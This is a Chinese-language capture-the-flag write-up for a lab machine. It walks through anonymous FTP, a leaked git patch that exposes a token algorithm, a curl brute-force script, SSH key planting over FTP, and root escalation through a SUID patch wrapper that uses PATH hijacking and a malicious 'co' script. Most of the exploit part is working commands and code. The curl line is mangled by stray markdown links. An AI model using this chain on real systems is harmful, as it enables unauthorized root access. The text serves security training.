靶机ip：192.168.56.149

一、信息收集

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p- -sV -sC 192.168.56.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 21:38 EDT
Nmap scan report for 192.168.56.149 (192.168.56.149)
Host is up (0.00030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0          0                1012 May 29 05:59 fix.patch
|_-rw-r--r--    1 1001       1001                0 May 29 05:51 hello.txt
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: Secure Download Portal
|_http-server-header: Apache/2.4.67 (Debian)
| http-git: 
|   192.168.56.149:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Security fix 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.77 seconds
```
通过扫描可以发现21端口可以anonymous登入，并且80端口可以使用git-dumper获取泄露的信息

二、漏洞复现

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat fix.patch 
From 27acb8268ac9b94f42372a50b2b06baec240f1a6 Mon Sep 17 00:00:00 2001
From: Admin <admin@maze.com>
Date: Fri, 29 May 2026 05:59:31 -0400
Subject: [PATCH] Security fix

---
 index.php | 5 +++--
 1 file changed, 3 insertions(+), 2 deletions(-)

diff --git a/index.php b/index.php
index 5e409a0..25cebd5 100644
--- a/index.php
+++ b/index.php
@@ -5,7 +5,8 @@ if (isset($_GET['validate'])) {
     $input_token = $_GET['validate'];
     $secret = "DebianFixedSalt";
     
-    $time_component = date('Y-m-d');
+    $current_hour = date('H');
+    $time_component = date('Y-m-d') . '-' . $current_hour;
     $expected = substr(hash('sha256', $secret . $time_component), 0, 16);
     
     if (hash_equals($expected, $input_token)) {
@@ -36,7 +37,7 @@ if (isset($_GET['validate'])) {
             <input type="submit" value="Validate Token">
         </form>
         <hr>
-        <p><i>System Status: Operational</i></p>
+        <p><i>System Status: Patched (v1.1)</i></p>
     </div>
 </body>
 </html>
-- 
2.47.3
```
补丁泄露了Web Token的完整算法，结合泄露的index.php源代码，我们可以通过AI获得如下的代码
```
#!/bin/bash
for offset in {-6..6}; do
    # 计算偏移后的小时
    hour=$(date -d "$offset hours" +"%Y-%m-%d-%H")
    # 生成 Token
    token=$(echo -n "DebianFixedSalt$hour" | sha256sum | cut -c1-16)
    echo "Trying hour $hour -> Token: $token"
    # 发送请求，只显示非“Invalid Token”的行（可能包含 Flag）
    response=$(curl -s "[http://192.168.56.148/?validate=$token"](http://192.168.56.148/?validate=$token%22))
    if [[ ["$response" != *"Invalid Token"*](https://github.com/newSoloman/CS/issues/%22$response%22%20!=%20*%22Invalid%20Token%22*) ]]; then
        echo "✅ Valid token found!"
        echo "Hour: $hour"
        echo "Token: $token"
        echo "Response:"
        echo "$response"
        break
    fi
done
```
获得登入凭据，player:EeP0PfwuaWSKKhYO1sEn，本来是想着直接进行SSH登入，但是SSH仅允许密钥登录，但FTP可以使用我们获得的凭据登入，并且允许上传文件
```
# 在攻击机生成密钥
$ ssh-keygen -t rsa -b 4096 -f diff_rsa

# FTP 上传公钥
$ ftp -nv 192.168.56.149
ftp> user player EeP0PfwuaWSKKhYO1sEn
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put diff_rsa.pub authorized_keys
ftp> bye

# SSH 登录
$ ssh -i diff_rsa [player@192.168.56.149](mailto:player@192.168.56.149)
player@Diff:~$ cat user.txt
flag{user-047a5e38dbf246416efbfeeca00362fd}
```

三、提权

```
$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/apply_patch    # ← 非标准 SUID 程序
```

```
$ ls -la /usr/local/bin/
-rwsr-xr-x 1 root root 16008 May 29 05:44 apply_patch
-rw-r--r-- 1 root root   157 May 29 05:44 apply_patch.c
```

查看源码内容

```
[#include](https://github.com/newSoloman/CS/issues/new#include) <stdlib.h>
[#include](https://github.com/newSoloman/CS/issues/new#include) <unistd.h>

int main() {
    setuid(0);
    system("cd /tmp && /usr/bin/patch -b -p1 < /home/player/in.patch");
    return 0;
}
```
```
`apply_patch` 存在两个致命缺陷：

1. **`system()` 未清理环境变量**——调用者（player）的 `PATH`、`PATCH_GET` 等环境变量被 SUID root 进程继承
2. **`/usr/bin/patch` 内部存在 `system()` 调用**——当 `PATCH_GET` 为正数时，patch 会调用 `system("co -l <文件名>")`，而 `co` 通过 `PATH` 解析

```bash
$ strings /usr/bin/patch | grep -E 'system|co -l'
system
co -l %s         # ← patch 内部通过 system() 调用 co
```

攻击链路：

```
PATCH_GET=1 (环境变量)
  → patch 读取 PATCH_GET，需要从 RCS 获取文件
  → patch 调用 system("co -l vfile")
  → shell 通过 PATH 查找 co
  → PATH 已被劫持到 /tmp/evil
  → 执行我们的恶意 /tmp/evil/co（以 root 权限！）
```

利用过程

步骤 1：搭建 RCS 环境

RCS 是触发 patch 调用 `co` 的诱饵：

```bash
mkdir -p /tmp/RCS /tmp/evil
echo 'ORIGINAL' > /tmp/vfile
chmod 444 /tmp/vfile
printf 'head\t1.1;\naccess;\nsymbols;\nlocks;\nstrict;\ncomment @# @;\n1.1\ndate 2026.05.29.05.00.00;\nauthor admin;\nstate Exp;\nbranches;\nnext ;\ndesc\n@init@\n1.1\nlog\n@init@\ntext\n@ORIGINAL@\n' > /tmp/RCS/vfile,v
```

步骤 2：创建恶意 co 脚本

这个脚本会以 **root 身份**执行：

```bash
cat > /tmp/evil/co << 'CO'
#!/bin/sh
# 以 root 身份执行！
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2E...（你的公钥）' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo "ROOT_PRIVESH uid=$(id)" > /tmp/pwned.txt
CO
chmod +x /tmp/evil/co

# patch 还会调用 rcsdiff，也需要一个假桩
printf '#!/bin/sh\nexit 0\n' > /tmp/evil/rcsdiff
chmod +x /tmp/evil/rcsdiff
```

 步骤 3：创建 Patch 文件

```bash
cat > /home/player/in.patch << 'DIFF'
--- a/vfile
+++ b/vfile
@@ -1 +1 @@
-ORIGINAL
+CHANGED
DIFF
```

 步骤 4：触发漏洞

```bash
PATH=/tmp/evil:$PATH PATCH_GET=1 /usr/local/bin/apply_patch
```

执行结果：

```
ROOT_PRIVESH uid=uid=0(root) gid=1000(player) groups=1000(player),100(users)
```

**提权成功！恶意 `co` 以 root 身份执行！**

> ⚠️ 注意：`/tmp` 是 `tmpfs` 且挂载了 `nosuid`，所以无法通过 `cp /bin/bash /tmp/bashroot && chmod 4777` 获得 SUID shell。必须通过 SSH 密钥或反向 shell 获得 root 访问。

### 3.4 获取 Root Shell

```bash
$ ssh -i diff_rsa root@192.168.56.149
root@Diff:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Diff:~# cat /root/root.txt
flag{root-be2c04a3c903018a7191736056f0a934}
```
